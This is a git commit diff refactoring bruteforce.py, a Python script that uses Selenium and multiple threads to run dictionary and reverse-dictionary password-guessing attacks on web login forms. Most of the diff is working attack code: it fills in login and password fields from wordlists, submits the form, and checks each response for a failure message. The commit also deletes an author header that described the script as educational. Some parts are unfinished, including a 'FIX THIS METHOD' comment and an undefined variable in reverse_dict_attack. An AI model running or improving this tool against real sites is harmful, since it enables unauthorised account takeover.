33fb3007ff6018f70dab7c608a3c6a8b341e3dae
Null <shmel3@localhost.localdomain>
2018-07-31 23:20:02 +0300

    TargetObj refactor

--- bruteforce.py
+++ bruteforce.py
@@ -1,23 +1,9 @@
-## ========================================================================= ##
-##                                                                           ##
-## Author : Eliseev Vlad                                                     ##
-## Contact link : https://github.com/shmel3                                  ##
-## License : All entire code is published under a GNU GPLv3 license          ##
-##                                                                           ##
-## =============================== Notes from author ======================= ##
-##                                                                           ##
-## This program was written in educational purposes.                         ##
-## Please, never use it with malicious intent.                               ##
-## You are free to use any of this code in your program, but I would be      ##
-## grateful if you leave my contact link in it.                              ##
-##                                                                           ##
-## ========================================================================= ##
-
-
-import threading
-from queue import Queue
-from selenium import webdriver
 from selenium.common.exceptions import NoSuchElementException
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium import webdriver
+from queue import Queue
+from config import *
+import threading
 import time
 import os
 
@@ -29,73 +15,88 @@ print_lock = threading.Lock()
 
 
 class TargetObj:
-	def __init__(self, target_info):
-		# new driver for new thread #
+	url = str()
+	login_var = str()
+	pass_var = str()
+	failure_sign = str()
+	button_text = str()
+
+	def __init__(self):
 		self.__driver = webdriver.Firefox()
-
-		# loading page #
-		self.__driver.get(target_info.url)
-		time.sleep(5) # timeout for loading page (todo change) #
-
-		# getting variables' input #
-		self.__login_var = target_info.login_var_name
-		self.__pass_var = target_info.password_var_name
-
-		# setting failure sign #
-		self.failure_sign = target_info.failure_sign
+		self.__driver.get(TargetObj.url)
+		#WebDriverWait(self.__driver, 10);
+		time.sleep(5)
 
 
 	def __get_input(self, var_name):
 		return self.__driver.find_element_by_name(var_name)
 
-
 	def substitute_login(self, login):
 		# find login input if it has been reloaded / readded #
 		try:
-			self.__login_input = self.__get_input(self.__login_var)
+			self.__login_input = self.__get_input(TargetObj.login_var)
 			self.__login_input.clear()
 			self.__login_input.send_keys(login)
-			#time.sleep(1)
-		except:
-			print('Unable to get login input.')
+		except NoSuchElementException:
+			print(LOGIN_INPUT_ERROR)
 			os._exit(1)
 
 
 	def substitute_password(self, password):
 		try:
-			self.__pass_input = self.__get_input(self.__pass_var)
+			self.__pass_input = self.__get_input(TargetObj.pass_var)
 			self.__pass_input.clear()
 			self.__pass_input.send_keys(password)
-			#time.sleep(1)
 		except:
-			print('Unable to get password input.')
+			print(PASSWORD_INPUT_ERROR)
 			os._exit(1)
 
 
 	def submit(self):
-		self.__pass_input.submit()
-		time.sleep(3)
+		button_xpath = XPATH_CONTAINS.format('button'
+                                             , '.'
+											 , TargetObj.button_text)
+		input_xpath = XPATH_CONTAINS.format('input'
+		                                    , '.'
+											, TargetObj.button_text)
+		try:
+			button = self.__driver.find_element_by_xpath(button_xpath)
+			button.click()
+		except NoSuchElementException:
+			try:
+				button = self.__driver.find_element_by_xpath(input_xpath)
+				button.click()
+			except:
+				try:
+					self.__pass_input.submit()
+				except:
+					print(ATTEMP_ERROR)
+					self.__driver.quit()
+		time.sleep(1)
 
 
-	def parse_reponse(self):
+	### FIX THIS METHOD !!! ###
+	def parse_response(self):
 		# looking for html element with failure sign #
-		xpath = "//*[contains(text(), '{}')]".format(self.failure_sign)
+		xpath = XPATH_CONTAINS.format('div', 'text()', self.failure_sign)
 		try:
 			elem = self.__driver.find_element_by_xpath(xpath)
 			return False
 		except NoSuchElementException:
 			return True
 
-
 	def exit_driver(self):
 		self.__driver.quit()
+
+
+
 
 
 def login_attemp(target_obj, login, password):
 	target_obj.substitute_login(login)
 	target_obj.substitute_password(password)
 	target_obj.submit()
-	return target_obj.parse_reponse()
+	return target_obj.parse_response()
 
 
 
@@ -110,7 +111,7 @@ def dict_attack(target_obj, queue, password_list):
 		for passwd in password_list:
 			result = login_attemp(target_obj, login, passwd)
 			with print_lock:
-				print('Trying {} : {} - {}'.format(login, passwd, result))
+				print(LOGIN_ATTEMP.format(login, passwd, result))
 		queue.task_done()
 
 
@@ -119,19 +120,19 @@ def reverse_dict_attack(target_obj, login_list, queue):
 	for login in login_list:
 		result = login_attemp(target_obj, login, password)
 		with print_lock:
-				print('Trying {} : {} - {}'.format(login, passwd, result))
+				print(LOGIN_ATTEMP.format(login, passwd, result))
 		queue.task_done()
 
 
 
-def brute_force(target_info, logins, passwords, num_threads, reverse = False):
+def brute_force(logins, passwords, num_threads, reverse = False):
 	q = Queue()
 	# list with objects of TargetObj class #
 	target_objs = []
 	if reverse == False:
 		for thread_counter in range(num_threads):
 			# creating target object with driver for each thread #
-			obj_per_thread = TargetObj(target_info)
+			obj_per_thread = TargetObj()
 			target_objs.append(obj_per_thread)
 			thrd = threading.Thread(target = dict_attack
                                     , args = (obj_per_thread, q, passwords))
